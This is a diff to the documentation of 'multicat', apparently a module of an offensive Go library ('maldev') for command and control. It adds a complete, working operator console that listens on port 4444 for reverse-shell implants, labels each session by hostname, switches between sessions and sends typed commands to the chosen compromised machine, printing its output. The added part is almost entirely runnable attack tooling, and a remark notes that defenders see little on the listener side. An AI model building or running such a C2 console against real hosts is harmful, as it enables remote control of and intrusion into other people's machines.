@@ -9,7 +9,7 @@
 
 ---
 
-## For Beginners
+## Primer
 
 Multicat is the operator's side of a reverse shell: one port, many concurrent agents. Each inbound connection gets a session ID and a lifecycle event. Defenders see nothing new here — the noise is on the implant's egress, not the listener.
 
@@ -70,6 +70,78 @@ func main() {
 ```
 
 The agent side (a `c2/shell` implant) should emit `BANNER:<hostname>\n` as its first write so the manager can label sessions without extra round-trips.
+
+---
+
+## Advanced — Interactive Session Roster
+
+Track sessions by ID, switch between them, and push a command to a specific
+agent. The `Events()` channel drives the UI state; `Get(id)` recovers a
+`Session` for I/O; `Remove(id)` is idempotent.
+
+```go
+package main
+
+import (
+    "bufio"
+    "context"
+    "fmt"
+    "os"
+    "strings"
+
+    "github.com/oioio-space/maldev/c2/multicat"
+    "github.com/oioio-space/maldev/c2/transport"
+)
+
+func main() {
+    lis, _ := transport.NewTCPListener(":4444")
+    mgr := multicat.New()
+    ctx, cancel := context.WithCancel(context.Background())
+    defer cancel()
+    go mgr.Listen(ctx, lis)
+
+    // Passive: log arrivals/departures.
+    go func() {
+        for ev := range mgr.Events() {
+            switch ev.Type {
+            case multicat.EventOpened:
+                fmt.Printf("[+] %s from %s (%s)\n",
+                    ev.Session.Meta.ID,
+                    ev.Session.Meta.RemoteAddr,
+                    ev.Session.Meta.Hostname)
+            case multicat.EventClosed:
+                fmt.Printf("[-] %s closed\n", ev.Session.Meta.ID)
+            }
+        }
+    }()
+
+    // Active: operator REPL — "list", "use <id>", "kill <id>".
+    in := bufio.NewScanner(os.Stdin)
+    var active *multicat.Session
+    for in.Scan() {
+        parts := strings.Fields(in.Text())
+        switch {
+        case len(parts) == 1 && parts[0] == "list":
+            for _, s := range mgr.Sessions() {
+                fmt.Printf("  %s  %s\n", s.Meta.ID, s.Meta.Hostname)
+            }
+        case len(parts) == 2 && parts[0] == "use":
+            if s, ok := mgr.Get(parts[1]); ok {
+                active = s
+            }
+        case len(parts) == 2 && parts[0] == "kill":
+            _ = mgr.Remove(parts[1])
+        default:
+            if active != nil {
+                fmt.Fprintln(active, in.Text())
+                buf := make([]byte, 4096)
+                n, _ := active.Read(buf)
+                os.Stdout.Write(buf[:n])
+            }
+        }
+    }
+}
+```
 
 ---
 
